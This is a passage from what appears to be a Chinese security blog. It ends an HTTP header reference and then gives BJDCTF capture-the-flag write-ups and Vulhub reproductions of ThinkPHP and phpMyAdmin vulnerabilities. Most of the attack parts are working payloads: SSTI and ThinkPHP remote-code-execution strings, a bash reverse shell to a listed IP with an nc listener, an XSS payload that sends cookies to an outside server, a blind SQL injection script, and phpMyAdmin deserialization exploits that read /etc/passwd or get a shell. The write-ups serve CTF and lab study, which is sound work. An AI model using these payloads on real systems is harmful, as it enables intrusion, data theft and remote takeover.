Nov 1994 08:12:31 GMT 常设 ETag 对于某个资源的某个特定版本的一个标识符，通常是一个 消息散列 ETag: &quot;737060cd8c284d8af7ad3082f209582d&quot; 常设 Expires 指定一个日期/时间，超过该时间则认为此回应已经过期 Expires: Thu, 01 Dec 1994 16:00:00 GMT 常设: 标准 Last-Modified 所请求的对象的最后修改日期(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示) Last-Modified: Tue, 15 Nov 1994 12:45:26 GMT 常设 Link 用来表达与另一个资源之间的类型关系，此处所说的类型关系是在 RFC 5988 中定义的 Link: ; rel=&quot;alternate&quot;[32] 常设 Location 用来 进行重定向，或者在创建了某个新资源时使用。 Location: http://www.w3.org/pub/WWW/People.html 常设 P3P 用于支持设置P3P策略，标准格式为“P3P:CP=&quot;your_compact_policy&quot;”。然而P3P规范并不成功，[33]大部分现代浏览器没有完整实现该功能，而大量网站也将该值设为假值，从而足以用来欺骗浏览器的P3P插件功能并授权给第三方Cookies。 P3P: CP=&quot;This is not a P3P policy! ``See http://www.google.com/support/accounts/bin/answer.py?hl=en&amp;answer=151657 for more info.&quot; 常设 Pragma 与具体的实现相关，这些字段可能在请求/回应链中的任何时候产生多种效果。 Pragma: no-cache 常设 Proxy-Authenticate 要求在访问代理时提供身份认证信息。 Proxy-Authenticate: Basic 常设 Public-Key-Pins[34] 用于缓解中间人攻击，声明网站认证使用的传输层安全协议证书的散列值 Public-Key-Pins: max-age=2592000; pin-sha256=&quot;E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=&quot;; 常设 Refresh 用于设定可定时的重定向跳转。右边例子设定了5秒后跳转至“http://www.w3.org/pub/WWW/People.html”。 Refresh: 5; url=http://www.w3.org/pub/WWW/People.html 专利并非标准Netscape实现的扩展，但大部分网页浏览器也支持。 Retry-After 如果某个实体临时不可用，则，此协议头用来告知客户端日后重试。其值可以是一个特定的时间段(以秒为单位)或一个超文本传输协议日期。 [35] Example 1: Retry-After: 120Example 2: Retry-After: Fri, 07 Nov 2014 23:59:59 GMT 常设 Server 服务器的名字 Server: Apache/2.4.1 (Unix) 常设 Set-Cookie HTTP cookie Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1 常设: 标准 Status 通用网关接口 协议头字段，用来说明当前这个超文本传输协议回应的 状态 。普通的超文本传输协议回应，会使用单独的“状态行”（”Status-Line”）作为替代，这一点是在 RFC 7230 中定义的。 [36] Status: 200 OK Not listed as a registered field name Strict-Transport-Security HTTP 严格传输安全这一头部告知客户端缓存这一强制 HTTPS 策略的时间，以及这一策略是否适用于其子域名。 Strict-Transport-Security: max-age=16070400; includeSubDomains 常设: 标准 Trailer 这个头部数值指示了在这一系列头部信息由由分块传输编码编码。 Trailer: Max-Forwards 常设 Transfer-Encoding 用来将实体安全地传输给用户的编码形式。当前定义的方法包括：分块（chunked）、compress、deflate、gzip和identity。 Transfer-Encoding: chunked 常设 Upgrade 要求客户端升级到另一个协议。 Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11 常设 Vary 告知下游的代理服务器，应当如何对未来的请求协议头进行匹配，以决定是否可使用已缓存的回应内容而不是重新从原始服务器请求新的内容。 Vary: * 常设 Via 告知代理服务器的客户端，当前回应是通过什么途径发送的。 Via: 1.0 fred, 1.1 example.com (Apache/1.1) 常设 Warning 一般性的警告，告知在实体内容体中可能存在错误。 Warning: 199 Miscellaneous warning 常设 WWW-Authenticate 表明在请求获取这个实体时应当使用的认证模式。 WWW-Authenticate: Basic 常设 X-Frame-Options[37] 点击劫持保护：deny：该页面不允许在 frame 中展示，即使是同域名内。sameorigin：该页面允许同域名内在 frame 中展示。allow-from *uri*：该页面允许在指定uri的 frame 中展示。allowall：允许任意位置的frame显示，非标准值。 X-Frame-Options: deny 过时的[38] 常见的非标准回应字段 字段名 说明 示例 X-XSS-Protection[39] 跨站脚本攻击 （XSS）过滤器 X-XSS-Protection: 1; mode=block Content-Security-Policy, X-Content-Security-Policy, X-WebKit-CSP[40] 内容安全策略定义。 X-WebKit-CSP: default-src &#39;self&#39; X-Content-Type-Options[41] 唯一允许的数值为”nosniff”，防止 Internet Explorer 对文件进行MIME类型嗅探。这也对 Google Chrome 下载扩展时适用。[42] X-Content-Type-Options: nosniff X-Powered-By[43] 表明用于支持当前网页应用程序的技术（例如：PHP）（版本号细节通常放置在 X-Runtime 或 X-Version 中） X-Powered-By: PHP/5.4.0 X-UA-Compatible[44] 推荐指定的渲染引擎（通常是向后兼容模式）来显示内容。也用于激活 Internet Explorer 中的 Chrome Frame。 X-UA-Compatible: IE=EmulateIE7 X-UA-Compatible: IE=edge X-UA-Compatible: Chrome=1 X-Content-Duration[45] 指出音视频的长度，单位为秒。只受Gecko内核浏览器支持。 X-Content-Duration: 42.666 fake google查看源码发现qaq,访问提示ssti 直接用vulhub上的payload: 1234567891011&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 就能得到flag old-hack提示thinkphp5，5.0.23 RCE的payload可以读flag 1234http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?s&#x3D;captcha#命令执行POST：_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;cat &#x2F;flag duangShell打开提示swp,访问.index.php.swp，下载下来 vi -r恢复得到 12345678910111213141516&lt;?phperror_reporting(0);echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;if (!isset($_POST[&#x27;girl_friend&#x27;])) &#123; die(&quot;where is P3rh4ps&#x27;s girl friend ???&quot;);&#125; else &#123; $girl = $_POST[&#x27;girl_friend&#x27;]; if (preg_match(&#x27;/\\&gt;|\\\\\\/&#x27;, $girl)) &#123; die(&#x27;just girl&#x27;); &#125; else if (preg_match(&#x27;/ls|phpinfo|cat|\\%|\\^|\\~|base64|xxd|echo|\\$/i&#x27;, $girl)) &#123; echo &quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;; &#125; else &#123; //duangShell~~~~ exec($girl); &#125;&#125; 可以看到没过滤管道和空格 由于buu靶机不能访问内网，新建一个小号去basic里找到linux-labs 新建一个index.php,写入 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.1.55.214&#x2F;2333 0&gt;&amp;1 然后起一个web服务 1php -S 0.0.0.0:8000 nc监听 1nc -lvp 2333 xss之光扫目录发现.git源码泄露，恢复源码 123&lt;?php$a = $_GET[&#x27;yds_is_so_beautiful&#x27;];$b = unserialize($a); 题目考察的知识点是php原生类反序列化 123&lt;?php$a =new Exception(&quot;&lt;script&gt;window.open(&#x27;http://vps/?a=&#x27;+document.cookie)&lt;/script&gt;&quot;);echo urlencode(serialize($a)); 简单注入fuzz一波发现过滤了好多东西 union select 单双引号 =号都过滤了 扫路径扫到robots.txtl里面hint.txt里有 1select * from users where username=&#x27;$_POST[&quot;username&quot;]&#x27; and password=&#x27;$_POST[&quot;password&quot;]&#x27; 我们就可以加个转义符号 1select * from users where username&#x3D;&#39;admin\\&#39; and password&#x3D;&#39;$password&#39; 此时username的值就被认为是admin\\&#39; and password= $password传 or sleep(3)%23发现能够延时，所以我们在sleep(3)传入注入语句 payload: 1or if((ascii(substr((&#123;1&#125;),&#123;&#125;,1)) regexp &#123;&#125;),1,0)# 由于表中只有一条数据，所以我们在1位置直接传字段的名字就能跑出数据了 简单做个实验 12345create database test;use test;create table test (id int(10),username varchar(50),password varchar(50));insert into test (id,username,password) values (&#x27;1&#x27;,&#x27;admin&#x27;,&#x27;admin&#x27;); 发现插入多条数据也可以这样用,但是有相似的话就会查出多条数据 写了个exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsurl=&#x27;http://b4b1391f-dea5-4d42-8e61-f68b27487be2.node3.buuoj.cn&#x27;proxies=&#123; &#x27;http&#x27;:&quot;http://127.0.0.1:8080&quot;&#125;def sqlin(sql): database=&#x27;&#x27; for i in range(1,50): f1=database top=127 low=33 while low&lt;=top: mid=(top+low)//2 data1=&#123; &#x27;username&#x27;:&#x27;admin\\\\&#x27;, &#x27;password&#x27;:&#x27; or if((ascii(substr((&#123;&#125;),&#123;&#125;,1)) &gt; &#123;&#125;),1,0)#&#x27;.format(sql,str(i),str(mid)) &#125; data2=&#123; &#x27;username&#x27;:&#x27;admin\\\\&#x27;, &#x27;password&#x27;:&#x27; or if((ascii(substr((&#123;&#125;),&#123;&#125;,1)) regexp &#123;&#125;),1,0)#&#x27;.format(sql,str(i),str(mid)) &#125; try: r1=requests.post(url,data=data2) print(i,mid) if &#x27;BJD needs to be stronger&#x27; in r1.text: database+=chr(mid) print(database) break r=requests.post(url,data=data1) if &quot;BJD needs to be stronger&quot; in r.text: low=mid+1 if &#x27;P3rh4ps&#x27; in r.text: top=mid-1 except Exception as e: pass if database==f1: print(database) break# database=&#x27;p3rh4ps&#x27;sql0=&#x27;database()&#x27;sql1=&#x27;username&#x27;sqlin(sql1) 文件探测抓包，看到http头里有hint:home.php 访问会跳转到 1home.php?file=system php://filter读源码，system.php 1234567891011121314151617181920212223242526272829303132333435363738394041home.php?file=php://filter/read=convert.base64-encode/resource=system&lt;?phperror_reporting(0);if (!isset($_COOKIE[&#x27;y1ng&#x27;]) || $_COOKIE[&#x27;y1ng&#x27;] !== sha1(md5(&#x27;y1ng&#x27;)))&#123; echo &quot;&lt;script&gt;alert(&#x27;why you are here!&#x27;);alert(&#x27;fxck your scanner&#x27;);alert(&#x27;fxck you! get out!&#x27;);&lt;/script&gt;&quot;; header(&quot;Refresh:0.1;url=index.php&quot;); die;&#125;$str2 = &#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#x27;;$str3 = &#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#x27;;$str4 = &#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#x27;;?&gt; &lt;?php$filter1 = &#x27;/^http:\\/\\/127\\.0\\.0\\.1\\//i&#x27;;$filter2 = &#x27;/.?f.?l.?a.?g.?/i&#x27;;if (isset($_POST[&#x27;q1&#x27;]) &amp;&amp; isset($_POST[&#x27;q2&#x27;]) &amp;&amp; isset($_POST[&#x27;q3&#x27;]) ) &#123; $url = $_POST[&#x27;q2&#x27;].&quot;.y1ng.txt&quot;; $method = $_POST[&#x27;q3&#x27;]; $str1 = &quot;~$ python fuck.py -u \\&quot;&quot;.$url .&quot;\\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;&quot;; echo $str1; if (!preg_match($filter1, $url) )&#123; die($str2); &#125; if (preg_match($filter2, $url)) &#123; die($str3); &#125; if (!preg_match(&#x27;/^GET/i&#x27;, $method) &amp;&amp; !preg_match(&#x27;/^POST/i&#x27;, $method)) &#123; die($str4); &#125; $detect = @file_get_contents($url, false); print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));&#125;?&gt; home.php: 1234567891011121314151617181920212223242526272829303132333435&lt;?phpsetcookie(&quot;y1ng&quot;, sha1(md5(&#x27;y1ng&#x27;)), time() + 3600);setcookie(&#x27;your_ip_address&#x27;, md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]), time()+3600);if(isset($_GET[&#x27;file&#x27;]))&#123; if (preg_match(&quot;/\\^|\\~|&amp;|\\|/&quot;, $_GET[&#x27;file&#x27;])) &#123; die(&quot;forbidden&quot;); &#125; if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123; die(&quot;not now!&quot;); &#125; if(preg_match(&quot;/.?a.?d.?m.?i.?n.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123; die(&quot;You! are! not! my! admin!&quot;); &#125; if(preg_match(&quot;/^home$/i&quot;, $_GET[&#x27;file&#x27;]))&#123; die(&quot;禁止套娃&quot;); &#125; else&#123; if(preg_match(&quot;/home$/i&quot;, $_GET[&#x27;file&#x27;]) or preg_match(&quot;/system$/i&quot;, $_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;].&quot;.php&quot;; &#125; else&#123; $file = $_GET[&#x27;file&#x27;].&quot;.fxxkyou!&quot;; &#125; echo &quot;现在访问的是 &quot;.$file . &quot;&lt;br&gt;&quot;; require $file; &#125;&#125; else &#123; echo &quot;&lt;script&gt;location.href=&#x27;./home.php?file=system&#x27;&lt;/script&gt;&quot;;&#125; 这里有个admin.php，试着访问一下 好像没啥思路了，再看下system.php 12$detect = @file_get_contents($url, false);print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect)); 和极客大挑战的某题很类似，我们只需在$method传%s%将%d转义就行，所以我们可以这样构造 可以看到我们已经ssrf读取到admin.php了，源码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phperror_reporting(0);session_start();$f1ag = &#x27;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#x27;; //fakefunction aesEn($data, $key)&#123; $method = &#x27;AES-128-CBC&#x27;; $iv = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;],true); return base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));&#125;function Check()&#123; if (isset($_COOKIE[&#x27;your_ip_address&#x27;]) &amp;&amp; $_COOKIE[&#x27;your_ip_address&#x27;] === md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) &amp;&amp; $_COOKIE[&#x27;y1ng&#x27;] === sha1(md5(&#x27;y1ng&#x27;))) return true; else return false;&#125;if ( $_SERVER[&#x27;REMOTE_ADDR&#x27;] == &quot;127.0.0.1&quot; ) &#123; highlight_file(__FILE__);&#125; else &#123; echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#x27;10px&#x27; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#x27;REMOTE_ADDR&#x27;];&#125;$_SESSION[&#x27;user&#x27;] = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);if (isset($_GET[&#x27;decrypt&#x27;])) &#123; $decr = $_GET[&#x27;decrypt&#x27;]; if (Check())&#123; $data = $_SESSION[&#x27;secret&#x27;]; include &#x27;flag_2sln2ndln2klnlksnf.php&#x27;; $cipher = aesEn($data, &#x27;y1ng&#x27;); if ($decr === $cipher)&#123; echo WHAT_YOU_WANT; &#125; else &#123; die(&#x27;爬&#x27;); &#125; &#125; else&#123; header(&quot;Refresh:0.1;url=index.php&quot;); &#125;&#125; else &#123; //I heard you can break PHP mt_rand seed mt_srand(rand(0,9999999)); $length = mt_rand(40,80); $_SESSION[&#x27;secret&#x27;] = bin2hex(random_bytes($length));&#125;?&gt; 看了看后面的随机数生成的代码，发现应该没有方法暴力破解出来 仔细看看，发现如果第一次我们设置了decrypt，$_SESSION[&#39;secret&#39;]就为空，即$data为空 而Cheak()函数是很好绕过的，所以我们可以构造: 12345678910&lt;?phperror_reporting(0);function aesEn($data, $key)&#123; $method = &#x27;AES-128-CBC&#x27;; $iv = md5(&#x27;174.0.222.75&#x27;,true); return base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));&#125;$cipher = aesEn($data, &#x27;y1ng&#x27;);echo $cipher; elementmaster题目有这两行代码 12&lt;p hidden id&#x3D;&quot;506F2E&quot;&gt;I am the real Element Masterrr!!!!!!&lt;&#x2F;p&gt;&lt;p hidden id&#x3D;&quot;706870&quot;&gt;@颖奇L&#39;Amore&lt;&#x2F;p&gt; 506F2E706870十六进制转字符得到Po.php，我哭了。。。 Po是一个化学元素，刚好和题目的图相关，用化学元素跑 12345678import requestss=&#x27;H, He, Li, Be, B, C, N, O, F, Ne, Na, Mg, Al, Si, P, S, Cl, Ar,K, Ca, Sc, Ti, V, Cr, Mn, Fe, Co, Ni, Cu, Zn, Ga, Ge, As, Se, Br, Kr, Rb, Sr, Y, Zr, Nb, Mo, Te, Ru, Rh, Pd, Ag, Cd, In, Sn, Sb, Te, I, Xe, Cs, Ba, La, Ce, Pr, Nd, Pm, Sm, Eu, Gd, Tb, Dy, Ho, Er, Tm, Yb, Lu, Hf, Ta, W, Re, Os, Ir, Pt, Au, Hg, Tl, Pb, Bi, Po, At, Rn, Fr, Ra, Ac, Th, Pa, U, Np, Pu, Am, Cm, Bk, Cf, Es, Fm,Md, No, Lr,Rf, Db, Sg, Bh, Hs, Mt, Ds, Rg, Cn, Nh, Fl, Mc, Lv, Ts, Og, Uue&#x27;for i in s.split(&#x27;, &#x27;): r=requests.get(&#x27;http://04302ff8-21bd-4bbb-86b9-401e9978d758.node3.buuoj.cn/&#123;&#125;.php&#x27;.format(i)) # print(i) if r.status_code==200: print(r.text,end=&#x27;&#x27;) 跑完得到And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php，访问得到flag Schrödinger抓包，发现post请求得时侯一直有set_cookie，并且前几位不变 base64解密得到纯数字，刚好是Unix时间戳，不懂，这样构造flag就在那个视频评论里 参考： https://blog.csdn.net/IOT2017/article/details/84069882 https://segmentfault.com/a/1190000015886194?utm_source=tag-newest","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"BJDCTF","slug":"BJDCTF","permalink":"http://www.moonback.xyz/tags/BJDCTF/"}]},{"title":"Vulhub之thinkphp","slug":"Vulhub之thinkphp","date":"2020-03-07T15:32:14.000Z","updated":"2020-03-24T03:53:07.137Z","comments":true,"path":"2020/03/07/Vulhub之thinkphp/","link":"","permalink":"http://www.moonback.xyz/2020/03/07/Vulhub%E4%B9%8Bthinkphp/","excerpt":"本篇博客主要复现了Vulhub上thinkphp相关内容！","text":"本篇博客主要复现了Vulhub上thinkphp相关内容！ 2.X RCE漏洞分析在ThinkPHP ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由： 1$res = preg_replace(&#x27;@(\\w+)&#x27;.$depr.&#x27;([^&#x27;.$depr.&#x27;\\/]+)@e&#x27;, &#x27;$var[\\&#x27;\\\\1\\&#x27;]=&quot;\\\\2&quot;;&#x27;, implode($depr,$paths)); 导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。 详细内容参见：https://www.moonback.xyz/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/ ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。 先介绍一下TP的路由规则 URL访问模式,可选参数0、1、2、3,代表以下四种模式： 0 (普通模式) 1 (PATHINFO 模式) -&gt;默认使用 2 (REWRITE 模式) 3 (兼容模式) PATHINFO 模式还分为3种规则,使用数字1、2、3代表以下三种模式: 1 普通模式(参数没有顺序,例如/m/module/a/action/id/1) 2 智能模式(系统默认使用的模式，可自动识别模块和操作/module/action/id/1/ 或者 /module,action,id,1/…) 3 兼容模式(通过一个GET变量将PATHINFO传递给dispather，默认为s，例如index.php?s=/module/action/id/1) 这些东西在ThinkPHP/Common/convention.php中定义的有 漏洞出现的位置位于ThinkPHP/Lib/Think/UtilDispatcher.class.php 漏洞复现我们可以构造没有的路由规则来rce 123?s=a/b/c/$&#123;phpinfo()&#125;s=a/b/c/$&#123;eval($_POST[1])&#125;?s=a/b/c/$&#123;@print(eval($_POST[1]))&#125; 5.0.23 RCE漏洞分析由于没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 远程代码执行漏洞 的产生。 漏洞影响版本： 5.0.0&lt;=ThinkPHP5&lt;=5.0.23 、5.1.0&lt;=ThinkPHP&lt;=5.1.30 漏洞位于thinkphp/library/think/Request.php 可以看到通过外部传入Config::get(&#39;var_method&#39;)可以造成该类的任意方法调用 这里我们又可以将类属性进行替换 啊 太难了 先挖好坑！。。。。。 漏洞复现我们最终构造的payload: 12345678http://127.0.0.1/index.php?s=captcha#命令执行POST1：_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoamiPOST2：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami#任意文件包含POST: _method=__construct&amp;method=get&amp;filter[]=think\\__include_file&amp;server[]=phpinfo&amp;get[]=/etc/passwd 命令执行1： 命令执行2： 任意文件读取： 5-rce漏洞分析 影响范围 5.x &lt; 5.1.315.x &lt;= 5.0.23 漏洞点在library/think/route/dispatch/Module.php 留个坑 漏洞复现5.1.x php版本&gt;5.5 12345http://127.0.0.1/index.php?s=index/think\\request/input?data[]=phpinfo()&amp;filter=asserthttp://127.0.0.1/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()http://127.0.0.1/index.php?s=index/\\think\\template\\driver\\file/write?cacheFile=shell.php&amp;content=&lt;?php%20phpinfo();?&gt; 5.0.x php版本&gt;=5.4 12http://127.0.0.1/index.php?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1http://your-ip:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1 12345678910111213app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami/thinkphp/public/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir/thinkphp/public/?s=index/\\think\\app/invokefunction&amp;function=phpinfo&amp;vars[0]=1/thinkphp/public/?s=index/\\think\\app/invokefunction&amp;function=system&amp;vars=dir/thinkphp/public/?s=index/\\think\\app/invokefunction&amp;function=system&amp;return_value=&amp;command=dir/thinkphp/public/?s=index/\\think\\app/invokefunction&amp;function=system&amp;vars[0]=dir&amp;vars[1][]=/thinkphp/public/index.php?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt; in-sqlinjection漏洞分析要求要开启DEBUG模式 Tp官方版本5.0.9默认依旧是开放着调试模式 漏洞复现可以爆出数据库账号密码 1/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 参考： https://mochazz.github.io/2019/04/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/ https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ https://xz.aliyun.com/t/3845 https://xz.aliyun.com/t/3570 https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/ https://xz.aliyun.com/t/125","categories":[],"tags":[{"name":"thinkphp","slug":"thinkphp","permalink":"http://www.moonback.xyz/tags/thinkphp/"},{"name":"vulhub","slug":"vulhub","permalink":"http://www.moonback.xyz/tags/vulhub/"},{"name":"复现","slug":"复现","permalink":"http://www.moonback.xyz/tags/%E5%A4%8D%E7%8E%B0/"}]},{"title":"Vulhub之phpmyadmin","slug":"Vulhub之phpmyadmin","date":"2020-03-07T15:32:03.000Z","updated":"2020-03-09T03:35:25.234Z","comments":true,"path":"2020/03/07/Vulhub之phpmyadmin/","link":"","permalink":"http://www.moonback.xyz/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/","excerpt":"本篇博客主要记录了Vulhub上phpmyadmin漏洞的相关内容！","text":"本篇博客主要记录了Vulhub上phpmyadmin漏洞的相关内容！ CVE-2018-12613漏洞简介已登录的攻击者可以利用此漏洞包含任意文件来读取内容，进一步可以包含session来getshell 影响范围phpmyadmin版本：4.8.0和4.8.1受到影响 漏洞复现复现过程：https://www.moonback.xyz/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/#CVE-2018-12613复现 CVE-2016-5734漏洞简介phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在其查找并替换字符串功能中，将用户输入的信息拼接进preg_replace函数第一个参数中。 在PHP5.4.7以前，preg_replace的第一个参数可以利用\\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此已登录的攻击者便可构造一个任意代码执行漏洞。 影响范围 4.0.10.16之前4.0.x版本 4.4.15.7之前4.4.x版本 4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞） 漏洞复现exp(python2)地址：https://www.exploit-db.com/exploits/40185 这里下载的是4.4.15.6版本，历史下载版本：https://www.phpmyadmin.net/files/ tbl_find_replace.php的24行中，将POST的find和replaceWwith传入到了$table_search的getReplacePreview方法中 $table_search是PMA_TableSearch对象实例化的结果,而PMA_TableSearch在libraries/TableSearch.class.php中进行了定义，我们定位到libraries/TableSearch.class.php的1430行 在getReplacePreview方法中，由于exp中设定了$useRegex的值，所以参数继续传递到_getRegexReplaceRows方法中，定位到1388行 在1408~1413行当中，preg_replace(&quot;/&quot; . $find . &quot;/&quot;, $replaceWith, $row[0]);很经典地还原了55856 Bug的场景，exp中通过 &quot;find&quot;: &quot;0/e\\0&quot;,&quot;replaceWith&quot;: payload,的POST提交，空字节截断并传入e修饰符进而执行我们的payload，也将替换的结果进行了回传，最终的复现如下： WooYun-2016-199433漏洞简介phpmyadmin 2.x版本中存在一处反序列化漏洞，该漏洞无需认证登陆，通过该漏洞，攻击者可以读取任意文件或执行任意代码。 漏洞范围phpmyadmin:2.X(具体版本不清楚，测试用的是2.8.0.4) 漏洞复现在scripts/setup.php中，存在输入变量configuration,该变量会被unserialize函数进行反序列化操作： 当通过该输入点传入一个序列化字符串的时候，会经反序列化出来一个对象。在这个对象反序列化的过程中，会自动触发某些魔法函数。 scripts/setup.php通过require_once函数引入了librarise/common.lib.php文件 而librarise/common.lib.php又引入了librarise/Config.class.php 在librarise/Config.class.php中存在魔法函数__wakeup，该魔法函数在对象被反序列化之后立即被触发调用： 可以看到，其内在满足条件后，会调用load()函数。继续跟踪load()函数： 当检测到file_get_contents被定义，则通过eval函数执行读入的字符串；如果没有file_get_contents函数，则通过file读入文件，同时利用implode函数把文件内容利用\\n拼接，再执行eval函数。 整体思路：php 1setup.php-&gt;common.lib.php-&gt;Config.class.php-&gt;__wakeup()-&gt;load()-&gt;eval(); 接下来就是回顾跟踪需要满足的字段和构造特定的序列化数据： 在输入点位置setup.php中，需要具备2个传参字段action和configuration，同时创建了$PMA_Config = new PMA_Config(); 而在控制点的load函数中，则只需要传入形参source和对应的特定数据即可。 1234567&lt;?phpclass PMA_Config&#123; public $source = &#x27;/etc/passwd&#x27;;&#125;$a = new PMA_Config();echo serialize($a); 我们就可以读文件了 1234567891011POST /scripts/setup.php HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 80action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125; 还有个更简单的exp: 12345678910111213141516171819&lt;?phpclass PMA_Config&#123;public $source;&#125;$t = new PMA_Config();$t -&gt; source = $_GET[&#x27;file&#x27;];$str = serialize($t);$url = $_GET[&#x27;url&#x27;];$data = &quot;configuration=&quot;.$str.&quot;&amp;action=test&quot;;echo $data;$ch = curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch, CURLOPT_HEADER, false);curl_setopt($ch, CURLOPT_POST,true);curl_setopt($ch, CURLOPT_POSTFIELDS, $data);curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);echo curl_exec($ch); ?&gt; Getshell 利用方式一 但是经过分析这个漏洞是不能读取php文件的，因为有了eval()，相当于任意文件包含了，不过另一方面这也是有好处的，如果能写入文件，文件中包含一个一句话就可以直接getshell了。作者给的方式是用error log。 根据作者的方法，使用默认环境，才发现有点鸡肋，比如，在ubuntu下，一般是不允许用root权限运行，实际测试中，我们是无法读取access.log的，所以getshell就比较困难。在windows下，由于几乎所有的浏览器和python模块都会很“自觉地”将特殊字符编码进行转换”，getshell就更困难了，所以只能用socket去构造shell。 Access log中就出现了shell了。 再用任意文件包含漏洞去包含，就可以拿到shell了。 利用方式二 exp修改为如下： 1234567&lt;?phpclass PMA_Config&#123; public $source = &#x27;ftp://admin:admin@127.0.0.1/phpinfo.txt&#x27;;&#125;$a = new PMA_Config();echo serialize($a); 通过FTP直接远程利用获取shell 前提是看allow_url_fopen（默认是开启的） 参考： https://larry.ngrep.me/2016/09/21/cve-2016-5734-analysis/ https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/ 